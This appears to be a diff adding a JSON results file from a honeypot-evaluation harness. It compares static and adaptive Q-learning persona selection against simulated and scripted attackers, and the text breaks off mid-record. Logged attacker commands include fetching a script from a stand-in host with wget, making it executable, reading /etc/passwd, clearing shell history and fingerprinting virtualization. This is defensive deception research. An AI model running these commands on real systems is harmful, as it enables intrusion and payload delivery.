@@ -1,0 +1,1274 @@
+{
+ "simulated": {
+  "config": {
+   "scenario": "persona_sensitive_sim",
+   "baselinePersona": "centos_7",
+   "trialsPerStrategy": 12,
+   "seed": 7,
+   "maxTrialSeconds": 600
+  },
+  "provenance": {
+   "runnerVersion": "deception_arena/1",
+   "scenarioKind": "SIMULATED",
+   "scenario": {
+    "kind": "SIMULATED",
+    "title": "Persona-sensitive simulated attacker (assumed preferences)",
+    "continueProbability": {
+     "raspberry_pi": 0.88,
+     "ubuntu_22": 0.8,
+     "debian_11": 0.72,
+     "aws_ec2": 0.7,
+     "centos_7": 0.62,
+     "windows_srv": 0.3
+    },
+    "fingerprintProbability": 0.04,
+    "maxCommands": 14,
+    "thinkSeconds": [
+     3,
+     25
+    ],
+    "pool": [
+     [
+      "uname -a",
+      "RECONNAISSANCE"
+     ],
+     [
+      "id",
+      "RECONNAISSANCE"
+     ],
+     [
+      "cat /etc/passwd",
+      "CREDENTIAL_HARVEST"
+     ],
+     [
+      "ps aux",
+      "RECONNAISSANCE"
+     ],
+     [
+      "netstat -tulnp",
+      "RECONNAISSANCE"
+     ],
+     [
+      "wget http://203.0.113.10/b.sh",
+      "MALWARE_DOWNLOAD"
+     ],
+     [
+      "chmod +x b.sh",
+      "MALWARE_DOWNLOAD"
+     ],
+     [
+      "crontab -l",
+      "PERSISTENCE"
+     ],
+     [
+      "cat ~/.ssh/authorized_keys",
+      "PERSISTENCE"
+     ],
+     [
+      "sudo -l",
+      "PRIVILEGE_ESCALATION"
+     ],
+     [
+      "ls -la /root",
+      "RECONNAISSANCE"
+     ],
+     [
+      "history -c",
+      "RECONNAISSANCE"
+     ]
+    ],
+    "fingerprintCommand": [
+     "systemd-detect-virt",
+     "RECONNAISSANCE"
+    ]
+   },
+   "learnerStart": {
+    "policy": "q_learning",
+    "epsilon": 0.05,
+    "episodes": 12087
+   },
+   "learnerSource": "temporary copy of models/q_table.json (shipped seed); never saved",
+   "qTableHashes": {
+    "before": {
+     "seedTable": "bf9b46a1d1cf1b283797a544e7e597900b4a042e6c87ac199a3cc709498990ff",
+     "runtimeTable": "08209e9989189bd45b6edf35486a446f120df36287a277a9dddd35f6379152f7"
+    },
+    "after": {
+     "seedTable": "bf9b46a1d1cf1b283797a544e7e597900b4a042e6c87ac199a3cc709498990ff",
+     "runtimeTable": "08209e9989189bd45b6edf35486a446f120df36287a277a9dddd35f6379152f7"
+    }
+   },
+   "cancelled": false,
+   "config": {
+    "scenario": "persona_sensitive_sim",
+    "baselinePersona": "centos_7",
+    "trialsPerStrategy": 12,
+    "maxTrialSeconds": 600,
+    "seed": 7,
+    "adaptiveEnabled": true
+   }
+  },
+  "trials": [
+   {
+    "strategy": "STATIC",
+    "index": 0,
+    "pairPosition": 0,
+    "persona": "centos_7",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.896161+00:00",
+    "durationSeconds": 67,
+    "commands": [
+     {
+      "command": "ls -la /root",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "netstat -tulnp",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "history -c",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 4.3997
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 0,
+    "pairPosition": 1,
+    "persona": "ubuntu_22",
+    "decision": {
+     "state": "centos_7",
+     "recommendedPersona": "ubuntu_22",
+     "appliedPersona": "ubuntu_22",
+     "explored": false,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 136.3908,
+      "debian_11": 9.8803,
+      "centos_7": 17.5174,
+      "windows_srv": 1.6841,
+      "aws_ec2": 1.9778,
+      "raspberry_pi": 9.0565
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.896161+00:00",
+    "durationSeconds": 67,
+    "commands": [
+     {
+      "command": "ls -la /root",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "netstat -tulnp",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "history -c",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 4.3997
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 1,
+    "pairPosition": 0,
+    "persona": "centos_7",
+    "decision": {
+     "state": "ubuntu_22",
+     "recommendedPersona": "centos_7",
+     "appliedPersona": "centos_7",
+     "explored": false,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 6.8447,
+      "debian_11": 2.8888,
+      "centos_7": 136.1195,
+      "windows_srv": 12.4056,
+      "aws_ec2": 18.3521,
+      "raspberry_pi": 8.5319
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.896161+00:00",
+    "durationSeconds": 43,
+    "commands": [
+     {
+      "command": "cat ~/.ssh/authorized_keys",
+      "intent": "PERSISTENCE"
+     },
+     {
+      "command": "sudo -l",
+      "intent": "PRIVILEGE_ESCALATION"
+     },
+     {
+      "command": "ps aux",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "ls -la /root",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 7.7808
+   },
+   {
+    "strategy": "STATIC",
+    "index": 1,
+    "pairPosition": 1,
+    "persona": "centos_7",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.896161+00:00",
+    "durationSeconds": 43,
+    "commands": [
+     {
+      "command": "cat ~/.ssh/authorized_keys",
+      "intent": "PERSISTENCE"
+     },
+     {
+      "command": "sudo -l",
+      "intent": "PRIVILEGE_ESCALATION"
+     },
+     {
+      "command": "ps aux",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "ls -la /root",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 7.7808
+   },
+   {
+    "strategy": "STATIC",
+    "index": 2,
+    "pairPosition": 0,
+    "persona": "centos_7",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.896161+00:00",
+    "durationSeconds": 60,
+    "commands": [
+     {
+      "command": "cat /etc/passwd",
+      "intent": "CREDENTIAL_HARVEST"
+     },
+     {
+      "command": "cat ~/.ssh/authorized_keys",
+      "intent": "PERSISTENCE"
+     },
+     {
+      "command": "ps aux",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 7.7863
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 2,
+    "pairPosition": 1,
+    "persona": "ubuntu_22",
+    "decision": {
+     "state": "centos_7",
+     "recommendedPersona": "ubuntu_22",
+     "appliedPersona": "ubuntu_22",
+     "explored": false,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 135.4424,
+      "debian_11": 9.8803,
+      "centos_7": 17.5174,
+      "windows_srv": 1.6841,
+      "aws_ec2": 1.9778,
+      "raspberry_pi": 9.0565
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.896161+00:00",
+    "durationSeconds": 60,
+    "commands": [
+     {
+      "command": "cat /etc/passwd",
+      "intent": "CREDENTIAL_HARVEST"
+     },
+     {
+      "command": "cat ~/.ssh/authorized_keys",
+      "intent": "PERSISTENCE"
+     },
+     {
+      "command": "ps aux",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 7.7863
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 3,
+    "pairPosition": 0,
+    "persona": "centos_7",
+    "decision": {
+     "state": "ubuntu_22",
+     "recommendedPersona": "centos_7",
+     "appliedPersona": "centos_7",
+     "explored": false,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 6.8447,
+      "debian_11": 2.8888,
+      "centos_7": 135.4754,
+      "windows_srv": 12.4056,
+      "aws_ec2": 18.3521,
+      "raspberry_pi": 8.5319
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.896161+00:00",
+    "durationSeconds": 6,
+    "commands": [
+     {
+      "command": "id",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 2.4906
+   },
+   {
+    "strategy": "STATIC",
+    "index": 3,
+    "pairPosition": 1,
+    "persona": "centos_7",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.896161+00:00",
+    "durationSeconds": 6,
+    "commands": [
+     {
+      "command": "id",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 2.4906
+   },
+   {
+    "strategy": "STATIC",
+    "index": 4,
+    "pairPosition": 0,
+    "persona": "centos_7",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.896161+00:00",
+    "durationSeconds": 25,
+    "commands": [
+     {
+      "command": "systemd-detect-virt",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "fingerprinted",
+    "fingerprinted": true,
+    "reward": -2.0034
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 4,
+    "pairPosition": 1,
+    "persona": "ubuntu_22",
+    "decision": {
+     "state": "centos_7",
+     "recommendedPersona": "ubuntu_22",
+     "appliedPersona": "ubuntu_22",
+     "explored": false,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 134.8696,
+      "debian_11": 9.8803,
+      "centos_7": 17.5174,
+      "windows_srv": 1.6841,
+      "aws_ec2": 1.9778,
+      "raspberry_pi": 9.0565
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.896161+00:00",
+    "durationSeconds": 25,
+    "commands": [
+     {
+      "command": "systemd-detect-virt",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "fingerprinted",
+    "fingerprinted": true,
+    "reward": -2.0034
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 5,
+    "pairPosition": 0,
+    "persona": "centos_7",
+    "decision": {
+     "state": "ubuntu_22",
+     "recommendedPersona": "centos_7",
+     "appliedPersona": "centos_7",
+     "explored": false,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 6.8447,
+      "debian_11": 2.8888,
+      "centos_7": 134.3152,
+      "windows_srv": 12.4056,
+      "aws_ec2": 18.3521,
+      "raspberry_pi": 8.5319
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.896161+00:00",
+    "durationSeconds": 33,
+    "commands": [
+     {
+      "command": "id",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "netstat -tulnp",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "chmod +x b.sh",
+      "intent": "MALWARE_DOWNLOAD"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 6.7765
+   },
+   {
+    "strategy": "STATIC",
+    "index": 5,
+    "pairPosition": 1,
+    "persona": "centos_7",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.896161+00:00",
+    "durationSeconds": 33,
+    "commands": [
+     {
+      "command": "id",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "netstat -tulnp",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "chmod +x b.sh",
+      "intent": "MALWARE_DOWNLOAD"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 6.7765
+   },
+   {
+    "strategy": "STATIC",
+    "index": 6,
+    "pairPosition": 0,
+    "persona": "centos_7",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.896161+00:00",
+    "durationSeconds": 8,
+    "commands": [
+     {
+      "command": "id",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 2.5503
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 6,
+    "pairPosition": 1,
+    "persona": "ubuntu_22",
+    "decision": {
+     "state": "centos_7",
+     "recommendedPersona": "ubuntu_22",
+     "appliedPersona": "ubuntu_22",
+     "explored": false,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 133.2707,
+      "debian_11": 9.8803,
+      "centos_7": 17.5174,
+      "windows_srv": 1.6841,
+      "aws_ec2": 1.9778,
+      "raspberry_pi": 9.0565
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.896161+00:00",
+    "durationSeconds": 26,
+    "commands": [
+     {
+      "command": "id",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "systemd-detect-virt",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "fingerprinted",
+    "fingerprinted": true,
+    "reward": -1.68
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 7,
+    "pairPosition": 0,
+    "persona": "centos_7",
+    "decision": {
+     "state": "ubuntu_22",
+     "recommendedPersona": "centos_7",
+     "appliedPersona": "centos_7",
+     "explored": false,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 6.8447,
+      "debian_11": 2.8888,
+      "centos_7": 133.5557,
+      "windows_srv": 12.4056,
+      "aws_ec2": 18.3521,
+      "raspberry_pi": 8.5319
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.896161+00:00",
+    "endedAt": "2026-11-11T19:21:48.897177+00:00",
+    "durationSeconds": 24,
+    "commands": [
+     {
+      "command": "chmod +x b.sh",
+      "intent": "MALWARE_DOWNLOAD"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 5.9729
+   },
+   {
+    "strategy": "STATIC",
+    "index": 7,
+    "pairPosition": 1,
+    "persona": "centos_7",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.897177+00:00",
+    "endedAt": "2026-11-11T19:21:48.897177+00:00",
+    "durationSeconds": 24,
+    "commands": [
+     {
+      "command": "chmod +x b.sh",
+      "intent": "MALWARE_DOWNLOAD"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 5.9729
+   },
+   {
+    "strategy": "STATIC",
+    "index": 8,
+    "pairPosition": 0,
+    "persona": "centos_7",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.897177+00:00",
+    "endedAt": "2026-11-11T19:21:48.897177+00:00",
+    "durationSeconds": 21,
+    "commands": [
+     {
+      "command": "ps aux",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 2.9002
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 8,
+    "pairPosition": 1,
+    "persona": "aws_ec2",
+    "decision": {
+     "state": "centos_7",
+     "recommendedPersona": "aws_ec2",
+     "appliedPersona": "aws_ec2",
+     "explored": true,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 131.7956,
+      "debian_11": 9.8803,
+      "centos_7": 17.5174,
+      "windows_srv": 1.6841,
+      "aws_ec2": 1.9778,
+      "raspberry_pi": 9.0565
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.897177+00:00",
+    "endedAt": "2026-11-11T19:21:48.897177+00:00",
+    "durationSeconds": 21,
+    "commands": [
+     {
+      "command": "ps aux",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 2.9002
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 9,
+    "pairPosition": 0,
+    "persona": "ubuntu_22",
+    "decision": {
+     "state": "aws_ec2",
+     "recommendedPersona": "ubuntu_22",
+     "appliedPersona": "ubuntu_22",
+     "explored": false,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 60.3923,
+      "debian_11": 0.0,
+      "centos_7": 0.0,
+      "windows_srv": 0.0,
+      "aws_ec2": 0.0,
+      "raspberry_pi": 0.0
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.897177+00:00",
+    "endedAt": "2026-11-11T19:21:48.897177+00:00",
+    "durationSeconds": 127,
+    "commands": [
+     {
+      "command": "ps aux",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "cat ~/.ssh/authorized_keys",
+      "intent": "PERSISTENCE"
+     },
+     {
+      "command": "ls -la /root",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "netstat -tulnp",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "wget http://203.0.113.10/b.sh",
+      "intent": "MALWARE_DOWNLOAD"
+     },
+     {
+      "command": "sudo -l",
+      "intent": "PRIVILEGE_ESCALATION"
+     },
+     {
+      "command": "crontab -l",
+      "intent": "PERSISTENCE"
+     },
+     {
+      "command": "ls -la /root",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "systemd-detect-virt",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "fingerprinted",
+    "fingerprinted": true,
+    "reward": 10.4735
+   },
+   {
+    "strategy": "STATIC",
+    "index": 9,
+    "pairPosition": 1,
+    "persona": "centos_7",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.897177+00:00",
+    "endedAt": "2026-11-11T19:21:48.897177+00:00",
+    "durationSeconds": 51,
+    "commands": [
+     {
+      "command": "ps aux",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "cat ~/.ssh/authorized_keys",
+      "intent": "PERSISTENCE"
+     },
+     {
+      "command": "ls -la /root",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "netstat -tulnp",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 6.4304
+   },
+   {
+    "strategy": "STATIC",
+    "index": 10,
+    "pairPosition": 0,
+    "persona": "centos_7",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.897177+00:00",
+    "endedAt": "2026-11-11T19:21:48.897177+00:00",
+    "durationSeconds": 39,
+    "commands": [
+     {
+      "command": "wget http://203.0.113.10/b.sh",
+      "intent": "MALWARE_DOWNLOAD"
+     },
+     {
+      "command": "wget http://203.0.113.10/b.sh",
+      "intent": "MALWARE_DOWNLOAD"
+     },
+     {
+      "command": "history -c",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 9.9016
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 10,
+    "pairPosition": 1,
+    "persona": "centos_7",
+    "decision": {
+     "state": "ubuntu_22",
+     "recommendedPersona": "centos_7",
+     "appliedPersona": "centos_7",
+     "explored": false,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 6.8447,
+      "debian_11": 2.8888,
+      "centos_7": 132.659,
+      "windows_srv": 12.4056,
+      "aws_ec2": 18.3521,
+      "raspberry_pi": 8.5319
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.897177+00:00",
+    "endedAt": "2026-11-11T19:21:48.897177+00:00",
+    "durationSeconds": 39,
+    "commands": [
+     {
+      "command": "wget http://203.0.113.10/b.sh",
+      "intent": "MALWARE_DOWNLOAD"
+     },
+     {
+      "command": "wget http://203.0.113.10/b.sh",
+      "intent": "MALWARE_DOWNLOAD"
+     },
+     {
+      "command": "history -c",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 9.9016
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 11,
+    "pairPosition": 0,
+    "persona": "ubuntu_22",
+    "decision": {
+     "state": "centos_7",
+     "recommendedPersona": "ubuntu_22",
+     "appliedPersona": "ubuntu_22",
+     "explored": false,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 131.7956,
+      "debian_11": 9.8803,
+      "centos_7": 17.5174,
+      "windows_srv": 1.6841,
+      "aws_ec2": 7.5053,
+      "raspberry_pi": 9.0565
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.897177+00:00",
+    "endedAt": "2026-11-11T19:21:48.897177+00:00",
+    "durationSeconds": 11,
+    "commands": [
+     {
+      "command": "id",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 2.6367
+   },
+   {
+    "strategy": "STATIC",
+    "index": 11,
+    "pairPosition": 1,
+    "persona": "centos_7",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.897177+00:00",
+    "endedAt": "2026-11-11T19:21:48.897177+00:00",
+    "durationSeconds": 11,
+    "commands": [
+     {
+      "command": "id",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "attacker_left",
+    "fingerprinted": false,
+    "reward": 2.6367
+   }
+  ]
+ },
+ "scripted": {
+  "config": {
+   "scenario": "scripted_recon",
+   "baselinePersona": "debian_11",
+   "trialsPerStrategy": 3,
+   "seed": 7,
+   "maxTrialSeconds": 600
+  },
+  "provenance": {
+   "runnerVersion": "deception_arena/1",
+   "scenarioKind": "SCRIPTED",
+   "scenario": {
+    "kind": "SCRIPTED",
+    "title": "Scripted reconnaissance (fixed script)",
+    "login": true,
+    "steps": [
+     [
+      "uname -a",
+      "RECONNAISSANCE",
+      12
+     ],
+     [
+      "id",
+      "RECONNAISSANCE",
+      8
+     ],
+     [
+      "cat /etc/passwd",
+      "CREDENTIAL_HARVEST",
+      15
+     ],
+     [
+      "ps aux",
+      "RECONNAISSANCE",
+      10
+     ],
+     [
+      "netstat -tulnp",
+      "RECONNAISSANCE",
+      20
+     ]
+    ]
+   },
+   "learnerStart": {
+    "policy": "q_learning",
+    "epsilon": 0.05,
+    "episodes": 12087
+   },
+   "learnerSource": "temporary copy of models/q_table.json (shipped seed); never saved",
+   "qTableHashes": {
+    "before": {
+     "seedTable": "bf9b46a1d1cf1b283797a544e7e597900b4a042e6c87ac199a3cc709498990ff",
+     "runtimeTable": "08209e9989189bd45b6edf35486a446f120df36287a277a9dddd35f6379152f7"
+    },
+    "after": {
+     "seedTable": "bf9b46a1d1cf1b283797a544e7e597900b4a042e6c87ac199a3cc709498990ff",
+     "runtimeTable": "08209e9989189bd45b6edf35486a446f120df36287a277a9dddd35f6379152f7"
+    }
+   },
+   "cancelled": false,
+   "config": {
+    "scenario": "scripted_recon",
+    "baselinePersona": "debian_11",
+    "trialsPerStrategy": 3,
+    "maxTrialSeconds": 600,
+    "seed": 7,
+    "adaptiveEnabled": true
+   }
+  },
+  "trials": [
+   {
+    "strategy": "STATIC",
+    "index": 0,
+    "pairPosition": 0,
+    "persona": "debian_11",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.900142+00:00",
+    "endedAt": "2026-11-11T19:21:48.900142+00:00",
+    "durationSeconds": 65,
+    "commands": [
+     {
+      "command": "uname -a",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "id",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "cat /etc/passwd",
+      "intent": "CREDENTIAL_HARVEST"
+     },
+     {
+      "command": "ps aux",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "netstat -tulnp",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "completed",
+    "fingerprinted": false,
+    "reward": 6.4679
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 0,
+    "pairPosition": 1,
+    "persona": "ubuntu_22",
+    "decision": {
+     "state": "debian_11",
+     "recommendedPersona": "ubuntu_22",
+     "appliedPersona": "ubuntu_22",
+     "explored": false,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 41.6513,
+      "debian_11": 0.0,
+      "centos_7": 0.0,
+      "windows_srv": 0.0,
+      "aws_ec2": 0.0,
+      "raspberry_pi": 0.0
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.900142+00:00",
+    "endedAt": "2026-11-11T19:21:48.901157+00:00",
+    "durationSeconds": 65,
+    "commands": [
+     {
+      "command": "uname -a",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "id",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "cat /etc/passwd",
+      "intent": "CREDENTIAL_HARVEST"
+     },
+     {
+      "command": "ps aux",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "netstat -tulnp",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "completed",
+    "fingerprinted": false,
+    "reward": 6.4679
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 1,
+    "pairPosition": 0,
+    "persona": "centos_7",
+    "decision": {
+     "state": "ubuntu_22",
+     "recommendedPersona": "centos_7",
+     "appliedPersona": "centos_7",
+     "explored": false,
+     "policy": "q_learning",
+     "epsilon": 0.05,
+     "qValues": {
+      "ubuntu_22": 6.8447,
+      "debian_11": 2.8888,
+      "centos_7": 136.1195,
+      "windows_srv": 12.4056,
+      "aws_ec2": 18.3521,
+      "raspberry_pi": 8.5319
+     }
+    },
+    "startedAt": "2026-11-11T19:21:48.901157+00:00",
+    "endedAt": "2026-11-11T19:21:48.901157+00:00",
+    "durationSeconds": 65,
+    "commands": [
+     {
+      "command": "uname -a",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "id",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "cat /etc/passwd",
+      "intent": "CREDENTIAL_HARVEST"
+     },
+     {
+      "command": "ps aux",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "netstat -tulnp",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "completed",
+    "fingerprinted": false,
+    "reward": 6.4679
+   },
+   {
+    "strategy": "STATIC",
+    "index": 1,
+    "pairPosition": 1,
+    "persona": "debian_11",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.901157+00:00",
+    "endedAt": "2026-11-11T19:21:48.901157+00:00",
+    "durationSeconds": 65,
+    "commands": [
+     {
+      "command": "uname -a",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "id",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "cat /etc/passwd",
+      "intent": "CREDENTIAL_HARVEST"
+     },
+     {
+      "command": "ps aux",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "netstat -tulnp",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "completed",
+    "fingerprinted": false,
+    "reward": 6.4679
+   },
+   {
+    "strategy": "STATIC",
+    "index": 2,
+    "pairPosition": 0,
+    "persona": "debian_11",
+    "decision": null,
+    "startedAt": "2026-11-11T19:21:48.901157+00:00",
+    "endedAt": "2026-11-11T19:21:48.901157+00:00",
+    "durationSeconds": 65,
+    "commands": [
+     {
+      "command": "uname -a",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "id",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "cat /etc/passwd",
+      "intent": "CREDENTIAL_HARVEST"
+     },
+     {
+      "command": "ps aux",
+      "intent": "RECONNAISSANCE"
+     },
+     {
+      "command": "netstat -tulnp",
+      "intent": "RECONNAISSANCE"
+     }
+    ],
+    "loginSucceeded": true,
+    "iocCount": 0,
+    "termination": "completed",
+    "fingerprinted": false,
+    "reward": 6.4679
+   },
+   {
+    "strategy": "ADAPTIVE",
+    "index": 2,
